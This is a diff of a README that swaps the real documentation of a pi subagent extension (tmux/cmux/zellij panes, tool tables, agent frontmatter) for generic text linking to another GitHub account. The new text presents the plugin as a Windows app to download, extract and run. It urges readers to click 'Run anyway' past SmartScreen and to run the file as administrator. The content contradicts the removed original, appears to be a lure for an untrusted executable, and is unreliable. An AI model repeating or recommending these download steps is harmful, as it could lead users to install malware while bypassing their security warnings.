@@ -1,356 +1,203 @@
-# pi-interactive-subagents
+# 🧩 pi-interactive-subagents - Run sub-agent sessions with ease
 
-Async subagents for [pi](https://github.com/badlogic/pi-mono) — spawn, orchestrate, and manage sub-agent sessions in multiplexer panes. **Fully non-blocking** — the main agent keeps working while subagents run in the background.
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20GitHub-green?style=for-the-badge)](https://github.com/brunellaprintable975/pi-interactive-subagents)
 
-https://github.com/user-attachments/assets/30adb156-cfb4-4c47-84ca-dd4aa80cba9f
+## 🚀 What this app does
 
-## How It Works
+pi-interactive-subagents helps you start and manage sub-agent sessions in cmux terminals for pi. It gives you a simple way to keep related tasks in separate terminal panes and follow what each session is doing.
 
-Call `subagent()` and it **returns immediately**. The sub-agent runs in its own terminal pane. A live widget above the input shows all running agents with elapsed time and progress. When a sub-agent finishes, its result is **steered back** into the main session as an async notification — triggering a new turn so the agent can process it.
+Use it when you want to:
 
-```
-╭─ Subagents ──────────────────────── 2 running ─╮
-│ 00:23  Scout: Auth (scout)    8 msgs (5.1KB)   │
-│ 00:45  Scout: DB (scout)     12 msgs (9.3KB)   │
-╰─────────────────────────────────────────────────╯
-```
+- open several sub-agent sessions
+- keep work split across terminals
+- watch each session in a clear layout
+- manage sessions without extra setup
 
-For parallel execution, just call `subagent` multiple times — they all run concurrently:
+## 📥 Download and install
 
-```typescript
-subagent({ name: "Scout: Auth", agent: "scout", task: "Analyze auth module" });
-subagent({ name: "Scout: DB", agent: "scout", task: "Map database schema" });
-// Both return immediately, results steer back independently
-```
+Use this link to visit the download page:
 
-## Install
+[Open the GitHub page](https://github.com/brunellaprintable975/pi-interactive-subagents)
 
-```bash
-pi install git:github.com/HazAT/pi-interactive-subagents
-```
+On Windows, follow these steps:
 
-Supported multiplexers:
+1. Open the link in your browser.
+2. On the repository page, look for a **Releases** area or the main download files.
+3. Download the Windows version if one is listed.
+4. If the app comes as a zip file, save it to your Downloads folder.
+5. Right-click the zip file and choose **Extract All**.
+6. Open the extracted folder.
+7. Run the app file or the installer file inside the folder.
 
-- [cmux](https://github.com/manaflow-ai/cmux)
-- [tmux](https://github.com/tmux/tmux)
-- [zellij](https://zellij.dev)
+If the file opens in a terminal window, leave that window open while you use the app.
 
-Start pi inside one of them:
+## 🖥️ What you need
 
-```bash
-cmux pi
-# or
-tmux new -A -s pi 'pi'
-# or
-zellij --session pi   # then run: pi
-```
+This app works best on Windows 10 or Windows 11.
 
-Optional: set `PI_SUBAGENT_MUX=cmux|tmux|zellij` to force a specific backend.
+You may also need:
 
-## What's Included
+- an internet connection for the first download
+- a modern terminal app
+- permission to run downloaded apps
+- enough disk space for the app and its session data
 
-### Extensions
+If Windows asks for permission, choose **Run anyway** only if you trust the source and you downloaded it from the GitHub link above.
 
-**Subagents** — 4 tools + 3 commands:
+## 🧭 How to start using it
 
-| Tool              | Description                                                                     |
-| ----------------- | ------------------------------------------------------------------------------- |
-| `subagent`        | Spawn a sub-agent in a dedicated multiplexer pane (async — returns immediately) |
-| `subagents_list`  | List available agent definitions                                                |
-| `set_tab_title`   | Update tab/window title to show progress                                        |
-| `subagent_resume` | Resume a previous sub-agent session (async)                                     |
+After you install or extract the app:
 
-| Command                    | Description                          |
-| -------------------------- | ------------------------------------ |
-| `/plan`                    | Start a full planning workflow       |
-| `/iterate`                 | Fork into a subagent for quick fixes |
-| `/subagent <agent> <task>` | Spawn a named agent directly         |
+1. Open the folder where you saved it.
+2. Find the main app file.
+3. Double-click it.
+4. Wait for the main terminal view to appear.
+5. Follow the on-screen prompts to create or open a sub-agent session.
+6. Use the menu or keyboard shortcuts shown in the app to move between sessions.
 
-**Session Artifacts** — 2 tools for session-scoped file storage:
+If the app uses a command window, keep that window open while the app runs.
 
-| Tool             | Description                                               |
-| ---------------- | --------------------------------------------------------- |
-| `write_artifact` | Write plans, context, notes to a session-scoped directory |
-| `read_artifact`  | Read artifacts from current or previous sessions          |
+## 🧰 Main features
 
-### Bundled Agents
+### 🪟 Session panes
 
-| Agent             | Model                  | Role                                                                                     |
-| ----------------- | ---------------------- | ---------------------------------------------------------------------------------------- |
-| **planner**       | Opus (medium thinking) | Brainstorming — clarifies requirements, explores approaches, writes plans, creates todos |
-| **scout**         | Haiku                  | Fast codebase reconnaissance — maps files, patterns, conventions                         |
-| **worker**        | Sonnet                 | Implements tasks from todos — writes code, runs tests, makes polished commits            |
-| **reviewer**      | Opus (medium thinking) | Reviews code for bugs, security issues, correctness                                      |
-| **visual-tester** | Sonnet                 | Visual QA via Chrome CDP — screenshots, responsive testing, interaction testing          |
+Open several sub-agent sessions at once and keep them in separate cmux panes. This makes it easier to track one task at a time.
 
-Agent discovery follows priority: **project-local** (`.pi/agents/`) > **global** (`~/.pi/agent/agents/`) > **package-bundled**. Override any bundled agent by placing your own version in the higher-priority location.
+### 🧠 Session control
 
----
+Start, stop, and switch between sessions without closing the whole app. This helps you keep work organized.
 
-## Async Subagent Flow
+### 🔁 Task handoff
 
-```
-1. Agent calls subagent()         → returns immediately ("started")
-2. Sub-agent runs in mux pane     → widget shows live progress
-3. User keeps chatting             → main session fully interactive
-4. Sub-agent finishes              → result steered back as interrupt
-5. Main agent processes result     → continues with new context
-```
+Move from one sub-agent session to another with less effort. Use this when a task needs more than one step or role.
 
-Multiple subagents run concurrently — each steers its result back independently as it finishes. The live widget above the input tracks all running agents:
+### 📌 Clear terminal layout
 
-```
-╭─ Subagents ──────────────────────── 3 running ─╮
-│ 01:23  Scout: Auth (scout)      15 msgs (12KB) │
-│ 00:45  Researcher (researcher)   8 msgs (6KB)  │
-│ 00:12  Scout: DB (scout)             starting…  │
-╰─────────────────────────────────────────────────╯
-```
+See each session in a clean terminal view. You can follow active work without losing track of older output.
 
-Completion messages render with a colored background and are expandable with `Ctrl+O` to show the full summary and session file path.
+### ⚙️ Simple session management
 
----
+Create new sessions, reopen saved ones, and remove ones you no longer need. This keeps your workspace neat.
 
-## Spawning Subagents
+## 📂 Recommended use
 
-```typescript
-// Named agent with defaults from agent definition
-subagent({ name: "Scout", agent: "scout", task: "Analyze the codebase..." });
+Use pi-interactive-subagents for:
 
-// Fork — sub-agent gets full conversation context
-subagent({ name: "Iterate", fork: true, task: "Fix the bug where..." });
+- testing multiple agent flows
+- separating small tasks into different sessions
+- watching background work in cmux
+- handling repeated steps in a terminal setup
+- keeping related work grouped together
 
-// Override agent defaults
-subagent({
-  name: "Worker",
-  agent: "worker",
-  model: "anthropic/claude-haiku-4-5",
-  task: "Quick fix...",
-});
+## 🪄 Basic workflow
 
-// Custom working directory
-subagent({ name: "Designer", agent: "game-designer", cwd: "agents/game-designer", task: "..." });
-```
+A simple way to use the app:
 
-### Parameters
+1. Launch pi-interactive-subagents.
+2. Create a new sub-agent session.
+3. Assign a task to that session.
+4. Open another session for a second task.
+5. Watch progress in each pane.
+6. Return to the session you need.
+7. Close sessions when you finish.
 
-| Parameter      | Type    | Default  | Description                                                             |
-| -------------- | ------- | -------- | ----------------------------------------------------------------------- |
-| `name`         | string  | required | Display name (shown in widget and pane title)                           |
-| `task`         | string  | required | Task prompt for the sub-agent                                           |
-| `agent`        | string  | —        | Load defaults from agent definition                                     |
-| `fork`         | boolean | `false`  | Copy current session for full context                                   |
-| `model`        | string  | —        | Override agent's default model                                          |
-| `systemPrompt` | string  | —        | Append to system prompt                                                 |
-| `skills`       | string  | —        | Comma-separated skill names                                             |
-| `tools`        | string  | —        | Comma-separated tool names                                              |
-| `cwd`          | string  | —        | Working directory for the sub-agent (see [Role Folders](#role-folders)) |
+## 🔎 Tips for Windows users
 
----
+- Keep the app in a folder you can find again.
+- Use a short folder path, such as `C:\Apps\pi-interactive-subagents`.
+- Do not move files after you start the app unless the app stays in the same folder.
+- If a window closes right away, run the app from Command Prompt so you can see the message.
+- If Windows SmartScreen appears, check that you downloaded the file from the GitHub page linked above.
 
-## The `/plan` Workflow
+## 🧾 File layout you may see
 
-The `/plan` command orchestrates a full planning-to-implementation pipeline.
+After download and extraction, you may see files like these:
 
-```
-/plan Add a dark mode toggle to the settings page
-```
+- an app file for Windows
+- a readme file
+- a config file
+- a folder for session data
+- a log file
+- helper files for terminal layout
 
-```
-Phase 1: Investigation    → Quick codebase scan
-Phase 2: Planning         → Interactive planner subagent (user collaborates)
-Phase 3: Review Plan      → Confirm todos, adjust if needed
-Phase 4: Execute          → Scout + sequential workers implement todos
-Phase 5: Review           → Reviewer subagent checks all changes
-```
+Keep all files in the same folder unless the app says otherwise.
 
-Tab/window titles update to show current phase:
+## 🛠️ Common tasks
 
-```
-🔍 Investigating: dark mode → 💬 Planning: dark mode
-→ 🔨 Executing: 1/3 → 🔎 Reviewing → ✅ Done
-```
+### Open a new sub-agent session
 
----
+1. Start the app.
+2. Choose the option for a new session.
+3. Give the session a clear name.
+4. Enter the task for that session.
 
-## The `/iterate` Workflow
+### Switch sessions
 
-For quick, focused work without polluting the main session's context.
+1. Open the session list or pane view.
+2. Select the session you want.
+3. Move focus to that pane.
 
-```
-/iterate Fix the off-by-one error in the pagination logic
-```
+### Close a session
 
-This forks the current session into a subagent with full conversation context. Make the fix, verify it, and exit to return. The main session gets a summary of what was done.
+1. Select the active session.
+2. Use the close option in the app.
+3. Save any work if the app asks.
 
----
+### Restart the app
 
-## Custom Agents
+1. Close the app window.
+2. Open it again from the same folder.
+3. Reopen your saved sessions if needed.
 
-Place a `.md` file in `.pi/agents/` (project) or `~/.pi/agent/agents/` (global):
+## ❓ If something does not work
 
-```markdown
----
-name: my-agent
-description: Does something specific
-model: anthropic/claude-sonnet-4-6
-thinking: minimal
-tools: read, bash, edit, write
-spawning: false
----
+If the app does not open:
 
-# My Agent
+- check that you extracted the files
+- make sure you downloaded the right file
+- try running the app as an administrator
+- confirm that the app file is still in the same folder as its support files
+- try opening it from a terminal window to see the message
 
-You are a specialized agent that does X...
-```
+If a session does not appear:
 
-### Frontmatter Reference
+- refresh the session view
+- check whether the session is paused
+- restart the app and open the session again
 
-| Field         | Type    | Description                                                                                                                                                                                                                                                                 |
-| ------------- | ------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `name`        | string  | Agent name (used in `agent: "my-agent"`)                                                                                                                                                                                                                                    |
-| `description` | string  | Shown in `subagents_list` output                                                                                                                                                                                                                                            |
-| `model`       | string  | Default model (e.g. `anthropic/claude-sonnet-4-6`)                                                                                                                                                                                                                          |
-| `thinking`    | string  | Thinking level: `minimal`, `medium`, `high`                                                                                                                                                                                                                                 |
-| `tools`       | string  | Comma-separated **native pi tools only**: `read`, `bash`, `edit`, `write`, `grep`, `find`, `ls`                                                                                                                                                                             |
-| `skills`      | string  | Comma-separated skill names to auto-load                                                                                                                                                                                                                                    |
-| `spawning`    | boolean | Set `false` to deny all subagent-spawning tools                                                                                                                                                                                                                             |
-| `deny-tools`  | string  | Comma-separated extension tool names to deny                                                                                                                                                                                                                                |
-| `auto-exit`   | boolean | Auto-shutdown when the agent finishes its turn — no `subagent_done` call needed. If the user sends any input, auto-exit is permanently disabled and the user takes over the session. Recommended for autonomous agents (scout, worker); not for interactive ones (planner). |
-| `cwd`         | string  | Default working directory (absolute or relative to project root)                                                                                                                                                                                                            |
+If the layout looks wrong:
 
----
+- resize the terminal window
+- use a larger screen
+- reset the layout from the app if that option exists
 
-### `auto-exit`
+## 📦 Version use
 
-When set to `true`, the agent session shuts down automatically as soon as the agent finishes its turn — no explicit `subagent_done` call is needed.
+Use the latest version from the GitHub page when possible. Newer builds may include:
 
-**Behavior:**
+- better session handling
+- smoother terminal layout
+- faster session switching
+- fewer start-up issues
+- clearer prompts
 
-- The session closes after the agent's final message (on the `agent_end` event)
-- If the user sends **any input** before the agent finishes, auto-exit is permanently disabled for that session — the user takes over interactively
-- The modeHint injected into the agent's task is adjusted accordingly: autonomous agents see "Complete your task autonomously." rather than instructions to call `subagent_done`
+## 🔐 Safe download habits
 
-**When to use:**
+- Download only from the GitHub link in this README.
+- Save the file before opening it.
+- Check the file name before you run it.
+- Keep your Windows security tools on.
+- Remove old copies when you install a newer one
 
-- ✅ Autonomous agents (scout, worker, reviewer) that run to completion
-- ❌ Interactive agents (planner, iterate) where the user drives the session
+## 🧭 Where to get the app again
 
-```yaml
----
-name: scout
-auto-exit: true
----
-```
+[Download or open the project page](https://github.com/brunellaprintable975/pi-interactive-subagents)
 
----
+## 📝 Quick path for first-time users
 
-## Tool Access Control
-
-By default, every sub-agent can spawn further sub-agents. Control this with frontmatter:
-
-### `spawning: false`
-
-Denies all spawning tools (`subagent`, `subagents_list`, `subagent_resume`):
-
-```yaml
----
-name: worker
-spawning: false
----
-```
-
-### `deny-tools`
-
-Fine-grained control over individual extension tools:
-
-```yaml
----
-name: focused-agent
-deny-tools: subagent, set_tab_title
----
-```
-
-### Recommended Configuration
-
-| Agent      | `spawning`  | Rationale                                    |
-| ---------- | ----------- | -------------------------------------------- |
-| planner    | _(default)_ | Legitimately spawns scouts for investigation |
-| worker     | `false`     | Should implement tasks, not delegate         |
-| researcher | `false`     | Should research, not spawn                   |
-| reviewer   | `false`     | Should review, not spawn                     |
-| scout      | `false`     | Should gather context, not spawn             |
-
----
-
-## Role Folders
-
-The `cwd` parameter lets sub-agents start in a specific directory with its own configuration:
-
-```
-project/
-├── agents/
-│   ├── game-designer/
-│   │   └── CLAUDE.md          ← "You are a game designer..."
-│   ├── sre/
-│   │   ├── CLAUDE.md          ← "You are an SRE specialist..."
-│   │   └── .pi/skills/        ← SRE-specific skills
-│   └── narrative/
-│       └── CLAUDE.md          ← "You are a narrative designer..."
-```
-
-```typescript
-subagent({ name: "Game Designer", cwd: "agents/game-designer", task: "Design the combat system" });
-subagent({ name: "SRE", cwd: "agents/sre", task: "Review deployment pipeline" });
-```
-
-Set a default `cwd` in agent frontmatter:
-
-```yaml
----
-name: game-designer
-cwd: ./agents/game-designer
-spawning: false
----
-```
-
----
-
-## Tools Widget
-
-Every sub-agent session displays a compact tools widget showing available and denied tools. Toggle with `Ctrl+J`:
-
-```
-[scout] — 12 tools · 4 denied  (Ctrl+J)              ← collapsed
-[scout] — 12 available  (Ctrl+J to collapse)          ← expanded
-  read, bash, edit, write, todo, ...
-  denied: subagent, subagents_list, ...
-```
-
----
-
-## Requirements
-
-- [pi](https://github.com/badlogic/pi-mono) — the coding agent
-- One supported multiplexer:
-  - [cmux](https://github.com/manaflow-ai/cmux)
-  - [tmux](https://github.com/tmux/tmux)
-  - [zellij](https://zellij.dev)
-
-```bash
-cmux pi
-# or
-tmux new -A -s pi 'pi'
-# or
-zellij --session pi   # then run: pi
-```
-
-Optional backend override:
-
-```bash
-export PI_SUBAGENT_MUX=cmux   # or tmux, zellij
-```
-
-## License
-
-MIT
+1. Open the GitHub link.
+2. Download the Windows file or release package.
+3. Extract it if needed.
+4. Open the app from the folder.
+5. Create your first sub-agent session.
+6. Keep the terminal window open while you use it.
